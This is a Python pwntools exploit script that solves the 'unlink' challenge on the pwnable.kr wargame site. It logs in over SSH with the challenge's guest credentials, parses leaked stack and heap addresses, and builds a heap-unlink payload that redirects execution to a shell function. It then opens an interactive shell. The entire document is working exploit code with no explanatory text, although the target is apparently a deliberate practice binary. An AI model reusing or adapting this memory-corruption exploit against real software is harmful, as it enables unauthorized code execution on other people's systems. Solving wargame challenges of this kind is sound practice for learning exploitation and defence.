from pwn import *
import sys
import struct

shell = 0x080484eb
PAYLOAD = struct.pack("I", shell)
PAYLOAD += "A"*12

con = ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)
r = con.process('./unlink')


first = r.recvline()
stack = first.split(": ")[1]
stack_address = stack.split("\n")[0]
#stack = r.recv()[:10].strip().ljust(8, '\x00')
log.info("Stack Leak: {}".format(repr(stack_address)))
stack_hex = int(stack_address, 16)
stack_hex += 0x10

second = r.recvline()
heap = second.split(": ")[1]
heap_address = heap.split("\n")[0]
#heap = r.recv()[:10].strip().ljust(8, '\x00')
log.info("Heap Leak: {}".format(repr(heap_address)))
heap_hex = int(heap_address, 16)
heap_hex += 0xc

r.recvuntil('now that you have leaks, get shell!')
PAYLOAD += struct.pack('I',heap_hex)
PAYLOAD += struct.pack('I',stack_hex)
print PAYLOAD

r.sendline(PAYLOAD)

data2 = r.recv()
log.info("data " + data2)
r.interactive()
